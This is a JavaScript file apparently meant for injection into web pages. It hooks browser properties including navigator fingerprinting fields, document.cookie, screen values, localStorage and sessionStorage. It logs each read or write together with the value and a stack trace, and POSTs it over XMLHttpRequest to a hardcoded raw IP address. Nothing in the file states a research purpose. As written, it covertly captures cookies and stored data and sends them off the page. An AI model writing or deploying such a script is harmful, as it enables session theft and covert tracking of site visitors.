if (Object.alreadyInjected === undefined)
{
    Object.alreadyInjected = true;
    var monitorD = {
        'window' : {
            'navigator' : {
                'appCodeName' : true,
                'appName' : true,
                'appVersion' : true,
                'cookieEnabled' : true,
                'geolocation' : true,
                'language' : true,
                'languages' : true,
                'onLine' : true,
                'oscpu' : true,
                'platform' : true,
                'product' : true,
                'productSub' : true,
                'userAgent' : true,
                'vendorSub' : true,
                'vendor' : true,
                'deviceMemory' : true,
                'hardwareConcurrency' : true,
                'plugins' : true
            },
            'document' : {
                'hasStorageAccess' : true,
                'requestStorageAccess' : true,
                'cookie' : true,
                'fonts' : true
            },
            'screen' : {
                'pixelDepth' : true,
                'colorDepth' : true,
                'height' : true,
                'width' : true
            },
            'localStorage' : true,
            'sessionStorage' : true
        }
    };

    var traceD = {};



    Object.getPropertyDescriptor = function (subject, name) {
        var pd = Object.getOwnPropertyDescriptor(subject, name);
        var proto = Object.getPrototypeOf(subject);
        while (pd === undefined && proto !== null) {
        pd = Object.getOwnPropertyDescriptor(proto, name);
        proto = Object.getPrototypeOf(proto);
        }
        return pd;
    };

    function send_log(log_str) {
        var xhr = new XMLHttpRequest();
        xhr.open("POST", 'http://1.255.54.63:10921/server', true);
        xhr.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
        xhr.send(log_str)
    }

    function getStackTrace() {
        var stack;

        try {
        throw new Error();
        } catch (err) {
        stack = err.stack;
        }

        return stack;
    }

    function loopTrace () {
        for (var key in traceD) {
            var ob = traceD[key];
            ob.cur = eval(key);
            if (ob.prev != ob.cur)
            {
                send_log(key + "monitor");
            }
            ob.prev = ob.cur;
            setTimeout( loopTrace, 1000 );
        }
    }


    function instrumentProperty(object, objectName,  propertyName) {
        var propDesc = Object.getPropertyDescriptor(object, propertyName);


        if(propDesc['configurable'] === true)
        {
            var originalGetter = propDesc.get;
            var originalSetter = propDesc.set;
            var originalValue = propDesc.value;

            // We overwrite both data and accessor properties as an instrumented
            // accessor property
            Object.defineProperty(object, propertyName, {
            configurable: true,
            get: (function() {
                return function() {
                var origProperty;

                // get original value
                if (originalGetter) { // if accessor property
                    origProperty = originalGetter.call(this);
                } else if ('value' in propDesc) { // if data property
                    origProperty = originalValue;
                } else {
                    console.error("Property descriptor for",
                        objectName + '.' + propertyName,
                        "doesn't have getter or value?");
                    return;
                }

                send_log(objectName + '.' + propertyName + origProperty +
                        "get from " + getStackTrace());
                    return origProperty;
                }
            })(),
            set: (function() {
                return function(value) {
                var returnValue;

                // set new value to original setter/location
                if (originalSetter) { // if accessor property
                    returnValue = originalSetter.call(this, value);
                } else if ('value' in propDesc) { // if data property
                    originalValue = value;
                    returnValue = value;
                } else {
                    console.error("Property descriptor for",
                        objectName + '.' + propertyName,
                        "doesn't have setter or value?");
                    return value;
                }

                // log set
                send_log(objectName + '.' + propertyName + value +
                    "set from" + getStackTrace());
                // return new value
                return returnValue;
                }
            })()
            });
        }
        else
        {
            var originalGetter = propDesc.get;
            var originalValue = propDesc.value;
            var origProperty;

            // get original value
            if (originalGetter) { // if accessor property
                origProperty = originalGetter.call(this);
            } else if ('value' in propDesc) { // if data property
                origProperty = originalValue;
            } else {
                console.error("Property descriptor for",
                    objectName + '.' + propertyName,
                    "doesn't have getter or value?");
            }
            traceD[objectName] = { 'cur' : origProperty, 'prev' : origProperty }
        }
    }

    function instrumentTree(object, base) {
        for (var key in object)
        {
            try
            {
                if (object[key] === true)
                {
                    instrumentProperty(eval(base), base, key);
                }
                else if (object[key] instanceof Object) {
                    instrumentTree(object[key], base + "." + key);
                }
            }
            catch (err)
            {
            }
        }
    }

    instrumentTree(monitorD['window'], 'window');
    loopTrace();
}
